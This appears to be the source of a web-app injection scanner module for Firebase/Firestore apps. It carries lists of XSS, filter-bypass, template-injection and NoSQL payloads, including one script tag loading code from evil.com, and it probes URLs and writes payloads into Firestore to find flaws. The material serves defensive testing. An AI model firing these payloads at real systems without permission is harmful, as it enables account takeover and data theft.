
const XSS_PAYLOADS = {
  basic: [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script src="https://evil.com/xss.js"></script>'
  ],
  
  eventHandlers: [
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe onload=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">'
  ],
  
  javascriptProtocol: [
    'javascript:alert(1)',
    'javascript:alert(document.domain)',
    'javascript:alert(document.cookie)',
    'data:text/html,<script>alert(1)</script>'
  ],
  
  encoded: [
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<script>script>alert(1)</<script>/script>'
  ],
  
  templateInjection: [
    '{{constructor.constructor("alert(1)")()}}',
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{{alert(1)}}',
    '{{$on.constructor("alert(1)")()}}',
    '[[${7*7}]]',
    '*{7*7}'
  ],
  
  domClobbering: [
    '<form id=x><input id=y></form>',
    '<img name="getElementById">',
    '<a id="__proto__" href="javascript:alert(1)">',
    '<input name="innerHTML" value="<img src=x onerror=alert(1)>">'
  ],
  
  filterBypass: [
    '<ScRiPt>alert(1)</sCrIpT>',
    '<script>alert(1)</script',
    '<script>alert(1)//</script>',
    '<script>alert`1`</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>\\u0061lert(1)</script>',
    '<img src=x onerror=\\u0061lert(1)>',
    '<img src=x onerror=alert&lpar;1&rpar;>',
    '<svg/onload=alert(1)>',
    '<svg\tonload=alert(1)>',
    '<svg\nonload=alert(1)>'
  ],
  
  reactSpecific: [
    '"><img src=x onerror=alert(1)>',
    '\');alert(1);//',
    '</script><script>alert(1)</script>',
    '{{constructor.constructor("return this")().alert(1)}}'
  ]
};

const FIRESTORE_XSS_PAYLOADS = [
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<script>window.__XSS_EXECUTED__=true</script>',
  '[Click me](javascript:alert("XSS"))',
  '![img](x" onerror="alert(\'XSS\')")',
  '<div onmouseover="alert(\'XSS\')">hover me</div>',
  '${alert("XSS")}',
  '{{constructor.constructor("alert(1)")()}}'
];


const NOSQL_PAYLOADS = {
  firestoreQuery: [
    { field: 'userId', value: { '$ne': null } },
    { field: 'userId', value: { '$gt': '' } },
    { field: 'role', value: { '$in': ['admin', 'user'] } },
    { field: 'deleted', value: { '$ne': true } },
    { field: 'permissions', value: { '$elemMatch': { '$eq': 'admin' } } },
    { field: 'isAdmin', value: { '$type': 'bool' } }
  ],
  
  stringInjection: [
    "' || '1'=='1",
    "'; return true; //",
    "1; return true",
    "admin'--",
    "admin' OR '1'='1",
    "${true}",
    "{{7*7}}"
  ]
};

const DANGEROUS_SINKS = [
  'innerHTML',
  'outerHTML',
  'insertAdjacentHTML',
  'document.write',
  'document.writeln',
  'eval',
  'setTimeout',
  'setInterval',
  'Function',
  'execScript',
  'setImmediate'
];

const URL_SINKS = [
  'location',
  'location.href',
  'location.replace',
  'location.assign',
  'window.open'
];

class InjectionScanner {
  constructor(config = {}) {
    this.config = config;
    this.findings = [];
    this.targetUrl = config.app?.url;
    this.db = null; // Firebase DB reference (set externally)
    this.testDocIds = [];
  }

  log(level, message) {
    const colors = {
      info: '\x1b[36m',
      warn: '\x1b[33m',
      error: '\x1b[31m',
      success: '\x1b[32m',
      reset: '\x1b[0m'
    };
    console.log(`  ${colors[level] || ''}[A03]${colors.reset} ${message}`);
  }

  addFinding(cwe, severity, title, description, evidence = null) {
    this.findings.push({
      category: 'A03',
      cwe,
      severity,
      title,
      description,
      evidence,
      tool: 'injection-scanner'
    });
  }

  
  async scan(page, firebaseDb = null) {
    this.log('info', 'Starting A03: Injection scan...');
    this.db = firebaseDb;
    await this.instrumentDOMSinks(page);
    await this.testURLReflection(page);
    await this.scanPageForDangerousPatterns(page);
    
    if (this.db) {
      await this.testFirestoreXSS(page);
      await this.testNoSQLInjection();
    }
    
    await this.testTemplateInjection(page);
    await this.cleanup();
    this.log('success', `A03 scan complete. Found ${this.findings.length} issues.`);
    return this.findings;
  }

  async instrumentDOMSinks(page) {
    this.log('info', 'Instrumenting DOM sinks...');
    
    try {
      await page.evaluateOnNewDocument(() => {
        window.__INJECTION_MONITOR__ = {
          sinkAccesses: [],
          xssDetected: false
        };
        
        const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
        Object.defineProperty(Element.prototype, 'innerHTML', {
          set: function(value) {
            const stack = new Error().stack;
            window.__INJECTION_MONITOR__.sinkAccesses.push({
              sink: 'innerHTML',
              value: String(value).substring(0, 500),
              element: this.tagName,
              stack: stack
            });
            
            if (/<script|javascript:|on\w+\s*=/i.test(value)) {
              window.__INJECTION_MONITOR__.xssDetected = true;
            }
            
            return originalInnerHTMLDescriptor.set.call(this, value);
          },
          get: originalInnerHTMLDescriptor.get
        });
        
        const originalWrite = document.write;
        document.write = function(...args) {
          window.__INJECTION_MONITOR__.sinkAccesses.push({
            sink: 'document.write',
            value: args.join('').substring(0, 500)
          });
          return originalWrite.apply(this, args);
        };
        
        // Monitor eval
        const originalEval = window.eval;
        window.eval = function(code) {
          window.__INJECTION_MONITOR__.sinkAccesses.push({
            sink: 'eval',
            value: String(code).substring(0, 500)
          });
          return originalEval.call(this, code);
        };
        
        const locationDescriptor = Object.getOwnPropertyDescriptor(window, 'location');
      });
      await page.waitForTimeout(2000);
      
      const monitorData = await page.evaluate(() => window.__INJECTION_MONITOR__);
      
      if (monitorData && monitorData.sinkAccesses.length > 0) {
        for (const access of monitorData.sinkAccesses) {
          const hasUserInput = /\?|#|location|search|hash|referrer|cookie/i.test(access.stack || '');
          const hasDangerousContent = /<script|javascript:|on\w+=/i.test(access.value);
          
          if (hasDangerousContent) {
            this.addFinding(
              'CWE-79',
              'HIGH',
              `Dangerous content in ${access.sink}`,
              `Potentially dangerous content detected in ${access.sink}: "${access.value.substring(0, 100)}..."`,
              { sink: access.sink, element: access.element }
            );
          }
        }
      }
      
      if (monitorData && monitorData.xssDetected) {
        this.addFinding(
          'CWE-79',
          'HIGH',
          'XSS pattern detected in DOM manipulation',
          'Script or event handler pattern was written to innerHTML',
          { detected: true }
        );
      }
      
    } catch (error) {
      this.log('warn', `DOM instrumentation error: ${error.message}`);
    }
  }

  async testURLReflection(page) {
    this.log('info', 'Testing URL parameter reflection...');
    
    const baseUrl = this.targetUrl;
    if (!baseUrl) return;
    
    const testCases = [
      { param: 'q', payload: '<script>alert(1)</script>' },
      { param: 'search', payload: '<img src=x onerror=alert(1)>' },
      { param: 'id', payload: '"><script>alert(1)</script>' },
      { param: 'name', payload: "'-alert(1)-'" },
      { param: 'redirect', payload: 'javascript:alert(1)' },
      { param: 'url', payload: 'javascript:alert(document.domain)' },
      { param: 'callback', payload: 'alert' },
      { param: 'next', payload: '//evil.com' }
    ];
    
    for (const test of testCases) {
      try {
        const testUrl = `${baseUrl}?${test.param}=${encodeURIComponent(test.payload)}`;
        
        await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
        
        const pageContent = await page.content();
        
        if (pageContent.includes(test.payload)) {
          this.addFinding(
            'CWE-79',
            'HIGH',
            `Reflected XSS via "${test.param}" parameter`,
            `Payload is reflected unencoded in response when passed via "${test.param}" parameter`,
            { parameter: test.param, payload: test.payload, url: testUrl }
          );
        }
        
        const partialPayload = test.payload.replace(/[<>"']/g, '');
        if (pageContent.includes(partialPayload) && test.payload.includes('<')) {
          this.addFinding(
            'CWE-79',
            'MEDIUM',
            `Partial reflection via "${test.param}" parameter`,
            `Payload content is partially reflected. May be exploitable with encoding bypass.`,
            { parameter: test.param, payload: test.payload }
          );
        }
        
      } catch (error) {
        // Page might not accept this parameter, continue
      }
    }
    
    try {
      await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 10000 });
    } catch (e) {}
  }

  async scanPageForDangerousPatterns(page) {
    this.log('info', 'Scanning for dangerous code patterns...');
    
    try {
      const pageSource = await page.content();
      const scripts = await page.evaluate(() => {
        return Array.from(document.querySelectorAll('script'))
          .map(s => s.textContent)
          .filter(s => s && s.length > 0);
      });
      
      const allCode = pageSource + '\n' + scripts.join('\n');
      
      const dangerousPatterns = [
        { 
          pattern: /\.innerHTML\s*=\s*[^;]*(?:location|document\.URL|window\.location|document\.referrer|document\.cookie)/gi,
          name: 'DOM XSS via innerHTML',
          cwe: 'CWE-79',
          severity: 'HIGH'
        },
        {
          pattern: /eval\s*\([^)]*(?:location|document\.URL|window\.location)/gi,
          name: 'eval() with URL input',
          cwe: 'CWE-95',
          severity: 'CRITICAL'
        },
        {
          pattern: /document\.write\s*\([^)]*(?:location|document\.URL)/gi,
          name: 'document.write with URL input',
          cwe: 'CWE-79',
          severity: 'HIGH'
        },
        {
          pattern: /\$\(.*\)\.html\s*\([^)]*(?:location|document\.URL|window\.location)/gi,
          name: 'jQuery .html() with URL input',
          cwe: 'CWE-79',
          severity: 'HIGH'
        },
        {
          pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{/gi,
          name: 'React dangerouslySetInnerHTML usage',
          cwe: 'CWE-79',
          severity: 'MEDIUM'
        },
        {
          pattern: /v-html\s*=/gi,
          name: 'Vue v-html directive usage',
          cwe: 'CWE-79',
          severity: 'MEDIUM'
        },
        {
          pattern: /\[innerHTML\]\s*=/gi,
          name: 'Angular innerHTML binding',
          cwe: 'CWE-79',
          severity: 'MEDIUM'
        },
        {
          pattern: /ng-bind-html(?!-unsafe)/gi,
          name: 'Angular ng-bind-html usage',
          cwe: 'CWE-79',
          severity: 'MEDIUM'
        },
        {
          pattern: /new\s+Function\s*\([^)]*(?:location|document\.URL)/gi,
          name: 'Function constructor with URL input',
          cwe: 'CWE-95',
          severity: 'CRITICAL'
        },
        {
          pattern: /setTimeout\s*\(\s*['"]/gi,
          name: 'setTimeout with string argument',
          cwe: 'CWE-95',
          severity: 'MEDIUM'
        },
        {
          pattern: /setInterval\s*\(\s*['"]/gi,
          name: 'setInterval with string argument',
          cwe: 'CWE-95',
          severity: 'MEDIUM'
        },
        {
          pattern: /location\.href\s*=\s*[^;]*(?:document\.URL|location\.search|location\.hash)/gi,
          name: 'Open redirect via URL manipulation',
          cwe: 'CWE-601',
          severity: 'MEDIUM'
        },
        {
          pattern: /window\.open\s*\([^)]*(?:location\.search|location\.hash)/gi,
          name: 'window.open with URL input',
          cwe: 'CWE-601',
          severity: 'MEDIUM'
        }
      ];
      
      for (const check of dangerousPatterns) {
        const matches = allCode.match(check.pattern);
        if (matches) {
          this.addFinding(
            check.cwe,
            check.severity,
            check.name,
            `Found ${matches.length} instance(s) of ${check.name}. This pattern can lead to injection vulnerabilities.`,
            { pattern: check.name, matchCount: matches.length, sample: matches[0].substring(0, 100) }
          );
        }
      }
      
    } catch (error) {
      this.log('warn', `Pattern scan error: ${error.message}`);
    }
  }

  async testFirestoreXSS(page) {
    this.log('info', 'Testing XSS via Firestore fields...');
    
    if (!this.db) {
      this.log('warn', 'No Firestore connection, skipping Firestore XSS tests');
      return;
    }
    
    const collections = this.config.collections || [{ name: 'posts' }, { name: 'messages' }, { name: 'comments' }];
    
    for (const collectionConfig of collections) {
      const collectionName = collectionConfig.name;
      
      const textFields = ['content', 'body', 'text', 'message', 'description', 'title', 'name', 'comment'];
      
      for (const payload of FIRESTORE_XSS_PAYLOADS.slice(0, 5)) { 
        try {
          const testDocId = `xss_test_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
          
          const testData = {};
          for (const field of textFields) {
            testData[field] = payload;
          }
          testData._testType = 'xss_injection_test';
          testData._timestamp = new Date().toISOString();
          
          try {
            const { doc, setDoc } = require('firebase/firestore');
            await setDoc(doc(this.db, collectionName, testDocId), testData);
            this.testDocIds.push({ collection: collectionName, id: testDocId });
            
            this.log('info', `Created test doc in ${collectionName} with XSS payload`);
            
            this.addFinding(
              'CWE-79',
              'MEDIUM',
              `XSS payload stored in ${collectionName}`,
              `Successfully stored XSS payload in Firestore collection "${collectionName}". If this content is rendered without sanitization, XSS is possible.`,
              { 
                collection: collectionName, 
                payload: payload.substring(0, 50),
                note: 'Actual XSS depends on how the application renders this data'
              }
            );
            
          } catch (writeError) {
            this.log('info', `Write blocked for ${collectionName} (rules working)`);
          }
          
        } catch (error) {
          // Continue with next payload
        }
      }
    }
    
    await this.checkRenderedContent(page);
  }

  async checkRenderedContent(page) {
    try {
      const xssExecuted = await page.evaluate(() => {
        return window.__XSS_EXECUTED__ === true;
      });
      
      if (xssExecuted) {
        this.addFinding(
          'CWE-79',
          'CRITICAL',
          'XSS payload executed',
          'An XSS payload stored in Firestore was executed when the page rendered.',
          { executed: true }
        );
      }
      
      const content = await page.content();
      for (const payload of FIRESTORE_XSS_PAYLOADS) {
        if (content.includes(payload)) {
          this.addFinding(
            'CWE-79',
            'HIGH',
            'XSS payload rendered without sanitization',
            `XSS payload found in rendered page content: ${payload.substring(0, 50)}...`,
            { payload: payload.substring(0, 50) }
          );
          break;
        }
      }
      
    } catch (error) {
      // Page might have navigated or closed
    }
  }


  async testNoSQLInjection() {
    this.log('info', 'Testing NoSQL injection...');
    
    if (!this.db) {
      this.log('warn', 'No Firestore connection, skipping NoSQL injection tests');
      return;
    }
    
    
    try {
      const { collection, query, where, getDocs } = require('firebase/firestore');
      
      const collections = this.config.collections || [{ name: 'users' }];
      
      for (const collConfig of collections) {
        const collName = collConfig.name;
        
        try {
          const allDocsQuery = query(collection(this.db, collName));
          const snapshot = await getDocs(allDocsQuery);
          
          if (snapshot.size > 0) {
            this.addFinding(
              'CWE-943',
              'HIGH',
              `Unrestricted query on ${collName}`,
              `Successfully queried all documents in "${collName}" collection without restrictions. ${snapshot.size} documents returned.`,
              { collection: collName, documentCount: snapshot.size }
            );
          }
        } catch (e) {
          // Blocked by rules - good!
        }
        
        for (const field of ['userId', 'email', 'uid']) {
          try {
            const emptyQuery = query(
              collection(this.db, collName),
              where(field, '>=', '')
            );
            const snapshot = await getDocs(emptyQuery);
            
            if (snapshot.size > 1) {
              this.addFinding(
                'CWE-943',
                'MEDIUM',
                `Query bypass via empty string on ${collName}.${field}`,
                `Query with where(${field}, ">=", "") returned ${snapshot.size} documents. This may bypass intended filtering.`,
                { collection: collName, field, documentCount: snapshot.size }
              );
            }
          } catch (e) {
            // Blocked or field doesn't exist
          }
        }
      }
      
    } catch (error) {
      this.log('warn', `NoSQL injection test error: ${error.message}`);
    }
  }

  async testTemplateInjection(page) {
    this.log('info', 'Testing template injection...');
    
    const baseUrl = this.targetUrl;
    if (!baseUrl) return;
    
    const templateTests = [
      { payload: '{{7*7}}', expected: '49', framework: 'Angular/Vue' },
      { payload: '${7*7}', expected: '49', framework: 'Template literals' },
      { payload: '<%= 7*7 %>', expected: '49', framework: 'EJS' },
      { payload: '#{7*7}', expected: '49', framework: 'Pug/Jade' },
      { payload: '{{constructor.constructor("return 7*7")()}}', expected: '49', framework: 'Angular sandbox escape' }
    ];
    
    for (const test of templateTests) {
      try {
        const testUrl = `${baseUrl}?q=${encodeURIComponent(test.payload)}`;
        await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
        
        const content = await page.content();
        
        if (content.includes(test.expected) && !content.includes(test.payload)) {
          this.addFinding(
            'CWE-94',
            'CRITICAL',
            `Template injection (${test.framework})`,
            `Template expression "${test.payload}" was evaluated to "${test.expected}". This indicates server or client-side template injection.`,
            { payload: test.payload, expected: test.expected, framework: test.framework }
          );
        }
        
      } catch (error) {
      }
    }
    
    try {
      await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 10000 });
    } catch (e) {}
  }

  async cleanup() {
    this.log('info', 'Cleaning up test documents...');
    
    if (!this.db || this.testDocIds.length === 0) return;
    
    try {
      const { doc, deleteDoc } = require('firebase/firestore');
      
      for (const testDoc of this.testDocIds) {
        try {
          await deleteDoc(doc(this.db, testDoc.collection, testDoc.id));
          this.log('info', `Deleted test doc: ${testDoc.collection}/${testDoc.id}`);
        } catch (e) {
          this.log('warn', `Could not delete ${testDoc.collection}/${testDoc.id}: ${e.message}`);
        }
      }
      
    } catch (error) {
      this.log('warn', `Cleanup error: ${error.message}`);
    }
    
    this.testDocIds = [];
  }
}

function containsXSSPattern(str) {
  const patterns = [
    /<script\b[^>]*>[\s\S]*?<\/script>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi,
    /<img[^>]+onerror/gi,
    /<svg[^>]+onload/gi
  ];
  
  return patterns.some(p => p.test(str));
}

function basicSanitize(str) {
  return str
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

module.exports = {
  InjectionScanner,
  XSS_PAYLOADS,
  FIRESTORE_XSS_PAYLOADS,
  NOSQL_PAYLOADS,
  DANGEROUS_SINKS,
  URL_SINKS,
  containsXSSPattern,
  basicSanitize
};
